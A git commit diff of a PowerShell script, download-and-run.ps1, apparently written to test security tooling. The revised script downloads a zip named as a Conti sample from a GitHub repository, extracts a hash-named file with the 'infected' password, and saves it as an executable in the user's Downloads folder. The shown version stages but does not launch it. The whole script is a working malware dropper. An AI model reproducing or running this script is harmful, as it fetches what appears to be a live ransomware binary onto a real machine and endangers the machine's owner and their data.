ef9e1304e3f5e8b7036bc7651b5a60413803352e
turvas <ygi@pildistaja.com>
2021-08-12 00:50:54 +0300

    improved ps

--- download-and-run.ps1
+++ download-and-run.ps1
@@ -1,5 +1,10 @@
-$outFilePath = "$env:USERPROFILE\Downloads\contitest.zip"
-$url = "https://github.com/turvas/ps_test/raw/master/conti-ebeca2df2.zip"
+$downloadPath = "$env:USERPROFILE\Downloads"
+$outFilePath = "$downloadPath\conti-temp.zip"
+$outExePath = "$downloadPath\conti-ebeca2df24a.exe"
+$url = "https://github.com/turvas/ps_test/raw/master/conti-pass-ebeca2df24a.zip"
 Invoke-WebRequest -Uri $url -OutFile $outFilePath
-notepad.exe $outFilePath 
+$exeFile = "ebeca2df24a55c629cf0ce0d4b703ed632819d8ac101b1b930ec666760036124"
+& 'C:\Program Files\7-Zip\7z.exe' x $outFilePath $exeFile -o"$downloadPath" -pinfected
+mv $downloadPath\$exeFile $outExePath
+ 
 
